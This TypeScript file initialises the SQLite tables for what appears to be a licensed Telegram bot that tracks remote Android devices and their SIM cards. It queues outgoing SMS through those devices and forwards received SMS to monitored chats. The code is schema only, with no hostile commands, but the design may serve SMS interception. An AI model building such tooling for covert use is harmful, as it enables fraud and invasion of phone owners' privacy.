import { db } from "../database";
import { logger } from "../../logger/logger";

export function initializeDatabase(): void {

    logger.info("USING UPDATED init.ts");

    // ---------------- USERS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS users (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER UNIQUE NOT NULL,

            username TEXT,

            first_name TEXT,

            last_name TEXT,

            license_id INTEGER,

            state TEXT DEFAULT 'WAITING_LICENSE',

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            FOREIGN KEY (license_id)
                REFERENCES licenses(id)

        );
    `);

    // ---------------- VERIFICATION CODES ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS verification_codes (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER UNIQUE NOT NULL,

            code TEXT UNIQUE NOT NULL,

            expires_at DATETIME NOT NULL,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP

        );
    `);

    // ---------------- LICENSES ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS licenses (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            license_key TEXT UNIQUE NOT NULL,

            plan TEXT NOT NULL,

            duration_days INTEGER NOT NULL,

            status TEXT NOT NULL DEFAULT 'unused',

            telegram_id INTEGER,

            generated_by INTEGER,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            activated_at DATETIME,

            expires_at DATETIME

        );
    `);

    // ---------------- BACKENDS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS backends (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER NOT NULL,

            backend_type TEXT NOT NULL,

            backend_identifier TEXT NOT NULL,

            config TEXT NOT NULL,

            status TEXT DEFAULT 'online',

            last_sync DATETIME,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            FOREIGN KEY (telegram_id)
                REFERENCES users(telegram_id)

        );
    `);

    // ---------------- DEVICES ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS devices (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            backend_id INTEGER NOT NULL,

            device_id TEXT NOT NULL,

            device_name TEXT,

            note TEXT,

            manufacturer TEXT,

            brand TEXT,

            model TEXT,

            android_version TEXT,

            phone_number TEXT,

            sim1_number TEXT,

            sim1_carrier TEXT,

            sim2_number TEXT,

            sim2_carrier TEXT,

            active_sim INTEGER DEFAULT 1,

            battery INTEGER DEFAULT 0,

            sim_count INTEGER DEFAULT 1,

            network_type TEXT,

            status TEXT DEFAULT 'offline',

            last_seen DATETIME,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            UNIQUE(backend_id, device_id),

            FOREIGN KEY (backend_id)
                REFERENCES backends(id)
                ON DELETE CASCADE

        );
    `);

    // ---------------- MONITOR CHATS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS monitor_chats (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER NOT NULL,

            chat_id TEXT UNIQUE NOT NULL,

            chat_title TEXT,

            chat_type TEXT NOT NULL,

            verified INTEGER DEFAULT 0,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP

        );
    `);

    // ---------------- SESSIONS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS sessions (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER NOT NULL,

            backend_id INTEGER,

            device_id TEXT,

            sim_slot INTEGER,

            started_at DATETIME,

            expires_at DATETIME,

            FOREIGN KEY (backend_id)
                REFERENCES backends(id)

        );
    `);

    // ---------------- MONITORING ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS monitoring_sessions (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER UNIQUE NOT NULL,

            backend_id INTEGER NOT NULL,

            device_id TEXT NOT NULL,

            sim_slot INTEGER NOT NULL,

            chat_id TEXT NOT NULL,

            status TEXT DEFAULT 'running',

            started_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            expires_at DATETIME NOT NULL,

            warning_sent INTEGER DEFAULT 0,

            stopped_reason TEXT,

            stopped_at DATETIME,

            FOREIGN KEY (backend_id)
                REFERENCES backends(id)
                ON DELETE CASCADE

        );
    `);

    // ---------------- SMS QUEUE ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS sms_queue (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER NOT NULL,

            backend_id INTEGER NOT NULL,

            device_id TEXT NOT NULL,

            command_id TEXT UNIQUE NOT NULL,

            phone_number TEXT NOT NULL,

            message TEXT NOT NULL,

            sim_slot INTEGER NOT NULL,

            status TEXT DEFAULT 'queued',

            firebase_path TEXT,

            queued_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            processed_at DATETIME,

            completed_at DATETIME,

            error_message TEXT

        );
    `);

    // ---------------- PROCESSED SMS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS processed_sms (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            backend_id INTEGER NOT NULL,

            device_id TEXT NOT NULL,

            source TEXT NOT NULL,

            unique_key TEXT NOT NULL,

            processed_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            UNIQUE(
                backend_id,
                device_id,
                source,
                unique_key
            )

        );
    `);

    // ---------------- KEYWORDS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS keyword_rules (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER UNIQUE NOT NULL,

            keyword TEXT NOT NULL,

            enabled INTEGER DEFAULT 1,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP

        );
    `);

    // ---------------- MESSAGE LOGS ----------------

    db.exec(`
        CREATE TABLE IF NOT EXISTS message_logs (

            id INTEGER PRIMARY KEY AUTOINCREMENT,

            telegram_id INTEGER NOT NULL,

            backend_id INTEGER NOT NULL,

            device_id TEXT NOT NULL,

            device_model TEXT,

            phone_number TEXT,

            message TEXT NOT NULL,

            received_at DATETIME NOT NULL,

            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,

            FOREIGN KEY (backend_id)
                REFERENCES backends(id)
                ON DELETE CASCADE

        );
    `);

    logger.info("Database initialized.");

}